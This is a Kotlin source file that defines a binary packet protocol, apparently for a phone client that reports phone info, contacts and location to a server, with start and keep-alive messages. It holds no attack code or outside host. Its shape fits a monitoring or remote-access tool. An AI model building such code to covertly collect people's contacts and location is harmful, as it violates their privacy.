package helper.protocol

import helper.toByteArray
import java.nio.charset.Charset


const val BUFFER_SIZE = 1024 * 20

interface Packet {
    val magicNumber: MagicNumber
    val data: ByteArray
}

class StartPacket(val id: String): Packet {

    override val magicNumber = MagicNumber.START
    override val data: ByteArray = magicNumber.value.toByteArray() + "$id\n".toByteArray(Charset.forName("UTF-8"))
}

class PhoneInfoPacket(val id: String, val info: String): Packet {

    override val magicNumber = MagicNumber.PHONE_INFO
    override val data: ByteArray = magicNumber.value.toByteArray() + "$id\n$info".toByteArray(Charset.forName("UTF-8"))
}

class KeepAlivePacket(val id: String): Packet {

    override val magicNumber = MagicNumber.KEEP_ALIVE
    override val data: ByteArray = magicNumber.value.toByteArray() + "$id\n".toByteArray(Charset.forName("UTF-8"))
}


class ContactsPacket(val id: String, val contacts: String): Packet {

    override val magicNumber = MagicNumber.CONTACTS
    override val data: ByteArray = magicNumber.value.toByteArray() + "$id\n$contacts".toByteArray(Charset.forName("UTF-8"))
}

class LocationPacket(val id: String, val location: String): Packet {

    override val magicNumber = MagicNumber.LOCATION
    override val data: ByteArray = magicNumber.value.toByteArray() + "$id\n$location".toByteArray(Charset.forName("UTF-8"))
}